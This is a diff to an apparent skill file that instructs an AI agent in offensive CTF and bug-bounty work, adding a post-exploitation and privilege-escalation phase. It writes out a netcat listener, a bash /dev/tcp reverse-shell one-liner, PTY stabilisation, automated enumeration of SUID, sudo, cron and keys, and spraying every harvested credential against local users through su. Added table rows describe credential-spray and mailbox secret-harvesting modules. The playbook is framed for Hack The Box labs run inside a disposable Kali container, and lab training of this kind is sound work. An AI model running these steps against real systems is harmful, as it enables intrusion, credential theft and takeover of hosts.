@@ -533,6 +533,55 @@ Once you find a vulnerability, use it to access more surface:
 - SSRF → access internal APIs → find more vulns
 - File upload → webshell → RCE
 
+### Phase 4: Post-Exploitation & Privilege Escalation (after you get RCE)
+
+**Getting a webshell/RCE is not the end — it is the start of post-ex. Do not
+keep firing one-off stateless `webshell.php?c=` GETs (re-auth per command is slow
+and brittle). Establish a stable shell, then run the local-privesc playbook.**
+
+**1. Upgrade to a stable shell.** Catch a reverse shell in kalibox instead of
+poking a stateless webshell per command:
+
+```bash
+kalibox shell -c "nc -lvnp 9001"      # listener inside the box (host-net: target reaches it)
+# then trigger from your RCE (your VPN IP is visible inside kalibox):
+#   bash -c 'bash -i >& /dev/tcp/<YOUR_VPN_IP>/9001 0>&1'
+# stabilise: python3 -c 'import pty;pty.spawn("/bin/bash")' ; then `export TERM=xterm`
+```
+
+**2. Enumerate for escalation** — use the toolkit, don't hand-roll:
+
+```python
+from bugbounty_ctf.api import PostExploit, post_exploit_enum
+# Feed it your run(cmd) (the webshell/reverse-shell command executor):
+loot = post_exploit_enum(run)   # SUID, sudo -l, capabilities, cron, writable files, keys
+```
+
+**3. Reuse EVERY harvested credential against local users — the #1 HTB pivot.**
+You almost always already have the password. Spray all creds you collected
+(PDF, mailboxes, DB config, app configs) against every local user (`/etc/passwd`
+bash users) via `su` — and `su` needs a PTY, so do NOT expect bare
+`su user -c id` to work from a webshell:
+
+```python
+# from your RCE, for each (user, password) you harvested:
+run('''python3 -c 'import pty,sys; pty.spawn(["su","-","haris"])' <<< "PASSWORD"''')
+# or use a PTY helper; see references/suid-webshell-exploitation.md and
+# references/advanced-escalation.md for the setresuid()/pty.openpty() patterns.
+```
+
+Also pivot creds you find as www-data: DB passwords (`brollin:...`), config
+secrets, and reused app-admin passwords are frequently the user's system
+password. SSH may be key-only (PasswordAuthentication no) — `su` is your friend
+then, not `sshpass`.
+
+**4. Escalation references** (read the one matching what you found):
+`references/advanced-escalation.md` (SUID PTY, PAM, docker escapes),
+`references/suid-webshell-exploitation.md` (SUID via webshell, pty),
+`references/suid-sg-docker-escalation.md`, `references/docker-privilege-escalation.md`,
+`references/escalate-ctf-walkthrough.md` (full SQLi→webshell→SUID→docker-root chain).
+Resolve a reference path with `${HERMES_SKILL_DIR}/references/<file>`.
+
 ### Automated Recon Script
 
 ```python
@@ -895,6 +944,7 @@ bundled file reliably (regardless of the agent's cwd) prefix it, e.g.
 | `bugbounty_ctf/advanced_tests.py` | Advanced: WAF/defense detection, race conditions, XXE, deserialization, JWT, file upload, XSS, IDOR, GraphQL, chain exploitation, reporting |
 | `bugbounty_ctf/web_recon.py` | Automated web target recon (shell-injection-safe) |
 | `bugbounty_ctf/kalibox.py` | **Isolation:** run all offensive/privileged tooling inside a disposable Kali container (`kalibox` CLI + `KaliBox`) — no host `sudo`/root |
+| `bugbounty_ctf/post_exploit.py` | **Post-ex:** after RCE — `post_exploit_enum(run)` sweeps SUID/sudo/caps/cron/writable files/keys for privesc (Phase 4) |
 | `bugbounty_ctf/nfs_enum.py` | **Infra:** NFS exports, parent/sibling mount candidates, sensitive-file + UID-locked scan (AUTH_SYS spoofing) |
 | `bugbounty_ctf/mail_enum.py` | **Infra:** IMAP/POP3 login check, concurrent credential spray, mailbox/attachment secret harvest |
 | `bugbounty_ctf/template_scan.py` | nuclei wrapper (auto-install), dependency-free builtin templates, version→CVE correlation (bundled DB + live NVD) |
